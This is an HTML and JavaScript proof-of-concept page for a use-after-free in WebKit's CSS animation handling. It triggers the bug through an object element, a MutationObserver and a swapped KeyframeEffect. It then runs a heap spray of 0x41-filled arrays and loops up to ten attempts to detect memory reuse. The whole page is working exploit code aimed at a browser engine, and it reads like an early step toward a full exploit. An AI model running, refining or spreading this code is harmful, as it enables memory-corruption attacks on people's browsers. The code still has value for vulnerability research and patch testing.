<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit CSS Animation UAF</title>
    <style>
      @keyframes keyframes {}
      cite { animation: keyframes 100ms; }
      button {
        margin-top: 20px;
        padding: 10px;
        font-size: 16px;
      }
      #status {
        margin-top: 10px;
        font-weight: bold;
      }
      #console {
        margin-top: 10px;
        white-space: pre-wrap;
        font-family: monospace;
      }
    </style>
</head>
<body>
    <h1>WebKit CSS Animation UAF</h1>
    <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
    <button id="button">Trigger PoC</button>
    <div id="status">Waiting...</div>
    <pre id="console"></pre>
    <object type="image/png" id="target-object">
        <cite id="target-cite"></cite>
        <dl id="target-dl" hidden></dl>
    </object>
    <p>PASS if this test doesn't crash</p>
    <script type="module">
        // Internal debug_log
        function debug_log(message) {
          const consoleDiv = document.getElementById('console');
          consoleDiv.textContent += message + '\n';
        }

        function sleep(ms) {
          return new Promise(resolve => setTimeout(resolve, ms));
        }

        const status = document.getElementById("status");
        const DELAY = 50; // Reduced for better synchronization
        const MAX_ATTEMPTS = 10;
        let attemptCount = 0;

        function heapSpray() {
          let spray = [];
          for (let i = 0; i < 5000; i++) { // Reduced to avoid early crash
            let arr = new Uint8Array(0x1000);
            for (let j = 0; j < arr.length; j++) {
              arr[j] = 0x41;
            }
            spray.push(arr);
          }
          debug_log("Heap spray completed");
          return spray;
        }

        function cleanDOM() {
          const existingObject = document.querySelector('#target-object');
          if (existingObject) {
            debug_log('Removing existing object');
            existingObject.remove();
          }
          const newObject = document.createElement('object');
          newObject.type = 'image/png';
          newObject.id = 'target-object';
          const newCite = document.createElement('cite');
          newCite.id = 'target-cite';
          const newDl = document.createElement('dl');
          newDl.id = 'target-dl';
          newDl.hidden = true;
          newObject.appendChild(newCite);
          newObject.appendChild(newDl);
          document.body.appendChild(newObject);
          debug_log('Created new object, cite, and dl');
          return {
            object: newObject,
            cite: newCite,
            dl: newDl
          };
        }

        async function triggerUAF() {
          const { object, cite, dl } = cleanDOM();
          attemptCount++;
          debug_log(`Attempt #${attemptCount}: Initiating exploit...`);
          status.textContent = `Attempt #${attemptCount} in progress...`;

          let observer;
          try {
            object.data = "x";
            cite.style.animationIterationCount = "infinite";
            debug_log("Set object.data to 'x' and animation to infinite");

            // Setup MutationObserver
            observer = new MutationObserver(async (mutations) => {
              debug_log("DOM tree modified, attempting UAF exploit...");
              await sleep(DELAY);
              try {
                const animation = cite.getAnimations()[0];
                if (!animation) {
                  debug_log("No animation found");
                  status.textContent = "Error: No animation";
                  return;
                }
                object.width = "1em";
                debug_log("Set object.width to 1em");
                object.codeBase; // Access deprecated property
                debug_log("Accessed object.codeBase");
                animation.effect = new KeyframeEffect(dl, {});
                debug_log("UAF triggered, preparing heap spray...");
                const spray = heapSpray();
                status.textContent = "Exploit triggered!";
                // Check for UAF
                debug_log("Checking for UAF memory reuse...");
                for (let i = 0; i < spray.length; i++) {
                  const arr = spray[i];
                  if (arr[0] !== 0x41) {
                    debug_log(`UAF detected at spray index: ${i}`);
                    status.textContent = "UAF detected!";
                    observer.disconnect();
                    return;
                  }
                }
                debug_log("No UAF detected in this attempt");
              } catch (e) {
                debug_log(`Error in observer: ${e.message}`);
                status.textContent = "Error: Exploit failed.";
              }
            });

            observer.observe(object, { attributes: true, childList: true, subtree: true });
            debug_log("Observer attached");

            // Wait for observer to trigger
            await sleep(DELAY * 2);
          } catch (e) {
            debug_log(`Error in triggerUAF: ${e.message}`);
            status.textContent = "Error: Exploit failed.";
          } finally {
            if (observer) observer.disconnect();
            object.remove();
            debug_log("Cleaned up DOM and observer");
          }
        }

        document.getElementById('button').addEventListener('click', async () => {
          status.textContent = "Running PoC...";
          for (let i = 0; i < MAX_ATTEMPTS; i++) {
            try {
              await triggerUAF();
              if (status.textContent === "UAF detected!") {
                break;
              }
              await sleep(100);
            } catch (e) {
              debug_log(`Attempt ${attemptCount} failed: ${e.message}`);
              status.textContent = "Error: Exploit failed.";
              if (attemptCount >= MAX_ATTEMPTS) {
                alert("Failed to achieve UAF after maximum attempts");
              }
            }
          }
        });
    </script>
</body>
</html>